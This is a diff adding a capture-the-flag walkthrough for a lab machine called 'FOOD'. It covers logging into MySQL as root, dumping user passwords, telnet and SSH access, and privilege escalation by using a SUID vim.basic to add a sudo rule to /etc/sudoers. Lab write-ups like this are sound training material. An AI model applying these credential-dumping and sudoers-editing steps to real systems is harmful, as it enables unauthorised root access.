@@ -1,0 +1,63 @@
+## MACHINE NAME : FOOD
+OPEN PORTS : 22 , 3306 , 9999 , 46969
+
+USERS : pasta , ramen ,food
+
+1.  PORT 3306 RUNNING "MYSQL"
+
+CONNECT TO IT WITH ' root ' AS USERNAME AND PASS :
+
+$ mysql -u root -h "ip addresss" -p
+
+$ select * from user 
+
+# its gives user ramen and password
+
+
+                 ramen:noodlesRTheBest
+
+
+2. PORT 46969 RUNNING "TELNET"
+
+CONNECT TO TELNET :
+
+$ telnet <IP> 46969
+
+#The Username and password are in caesor cipher. 
+
+               food:givemecookies
+
+
+#SSH PASSWORDS:
+
+pasta:pastaisdynamic
+
+  ramen:noodlesRTheBest
+
+food:givemecookies
+
+
+#Privilege Escalation
+
+$ find / -type f -perm -4000 2>/dev/null
+
+# WE CAN USE VIM TO BECOME ROOT
+
+vim.basic binary is vuln to read and write to privilaged files. vim.basic /etc/sudoers
+Press i
+Add this line after the line with root is the start.
+food ALL=(ALL:ALL) ALL
+Press Ctrl+[
+Press :w! Enter
+Press :q! Enter
+
+$ sudo su
+
+#ENTER PASS FOR CURRENT USER 
+
+   food:givemecookies
+
+
+
+NOW YOU ARE ROOT !!!!
+
